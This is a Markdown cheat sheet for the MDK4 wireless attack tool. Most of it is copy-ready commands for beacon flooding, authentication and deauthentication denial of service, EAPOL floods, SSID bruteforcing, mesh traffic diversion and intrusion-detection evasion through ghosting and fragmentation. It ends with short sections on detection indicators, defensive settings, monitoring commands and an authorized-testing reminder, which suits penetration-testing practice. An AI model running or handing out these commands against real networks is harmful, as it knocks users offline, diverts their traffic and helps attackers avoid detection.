# MDK4 Quick Reference

## Installation

```bash
sudo apt install mdk4
```

## Basic Syntax

```bash
mdk4 <interface> <attack_mode> [options]
```

## Attack Modes

| Mode | Name | Description |
|------|------|-------------|
| `b` | Beacon Flood | Fake APs |
| `a` | Auth DoS | Auth storm |
| `p` | SSID Probing | SSID discovery/bruteforce |
| `d` | Deauth/Disassoc | Client disconnection |
| `m` | Michael Shutdown | TKIP DoS |
| `e` | EAPOL Injection | 802.1X flooding |
| `s` | Mesh Attacks | 802.11s attacks |
| `w` | WIDS Confusion | IDS evasion |
| `f` | Packet Fuzzer | Protocol fuzzing |
| `x` | Protocol PoC | Vulnerability testing |

## Quick Commands

### Beacon Flood
```bash
mdk4 wlan0 b                                    # Basic
mdk4 wlan0 b -n "EvilAP" -c 6                  # Named
mdk4 wlan0 b --ghost 1000,54,10                # With ghosting
```

### Authentication DoS
```bash
mdk4 wlan0 a                                    # All APs
mdk4 wlan0 a -c 6                              # Specific channel
mdk4 wlan0 a --ghost 500,54,10                 # Ghosted
```

### Deauthentication
```bash
mdk4 wlan0 d                                    # All clients
mdk4 wlan0 d -c 6                              # Specific channel
mdk4 wlan0 d -m AA:BB:CC:DD:EE:FF             # Specific client
mdk4 wlan0 d --frag 2,8,50                     # Fragmented
mdk4 wlan0 d --ghost 1000,54,10                # Ghosted
```

### EAPOL Injection
```bash
mdk4 wlan0 e                                    # Start flood
mdk4 wlan0 e -l                                # Logoff flood
mdk4 wlan0 e -i AA:BB:CC:DD:EE:FF             # Specific AP
```

### SSID Bruteforce
```bash
mdk4 wlan0 p -f /usr/share/wordlists/rockyou.txt
```

### Mesh Network Attacks
```bash
mdk4 wlan0 s -f                                # Flood
mdk4 wlan0 s -b                                # Black holes
mdk4 wlan0 s -d                                # Divert traffic
```

### WIDS Evasion
```bash
mdk4 wlan0 w                                    # Basic
mdk4 wlan0 w -c                                # Cross-connect
mdk4 wlan0 w -r                                # Fake rogues
```

## IDS Evasion Options

### Ghosting
```bash
--ghost <period>,<max_rate>,<min_txpower>
# period: Switch interval (ms)
# max_rate: Max bitrate (MBit)
# min_txpower: Min TX power (dBm)
```

### Fragmenting
```bash
--frag <min_frags>,<max_frags>,<percent>
# min_frags: Minimum fragments
# max_frags: Maximum (0=standard)
# percent: Packets to fragment
```

## Common Options

```
-c CHANNEL    # Target channel(s)
-m MAC        # Target client
-i MAC        # Target AP
-t MAC        # Target BSSID
-n NAME       # Network name
-f FILE       # Wordlist
-w            # WPA encrypted
-l            # Logoff (EAPOL)
```

## Setup Monitor Mode

```bash
airmon-ng start wlan0
# Use wlan0mon interface
mdk4 wlan0mon a
```

## Detection Indicators

- Fake APs appearing
- Deauth packets flooding
- Auth request storms
- EAPOL floods
- Mesh route anomalies

## Defense Quick Fixes

```bash
# Enable WPA3/SAE
# Enable 802.11w (PMF)
# Deploy WIDS/WIPS
# Enable client isolation
```

## Monitor Commands

```bash
airodump-ng wlan0mon
tcpdump -i wlan0mon 'type mgt subtype deauth'
tcpdump -i wlan0mon 'ether proto 0x888e'
```

## MDK3 vs MDK4

| Feature | MDK3 | MDK4 |
|---------|------|------|
| Modes | 8 | 10 |
| Mesh | No | Yes |
| EAPOL | No | Yes |
| IDS Evasion | No | Yes |
| Fuzzer | No | Yes |
| License | GPLv2 | GPLv3 |

## System Requirements

- Monitor mode capable adapter
- Root/sudo privileges
- aircrack-ng installed
- Injection-capable driver

## Troubleshooting

| Issue | Solution |
|-------|----------|
| No monitor mode | `airmon-ng start wlan0` |
| Injection fails | `aireplay-ng -9 wlan0mon` |
| Permission denied | Use `sudo` |
| Wrong interface | Check `iwconfig` |

## Legal Reminder

**Authorized testing only!** MDK4 disrupts WiFi networks. Always obtain written permission before testing.
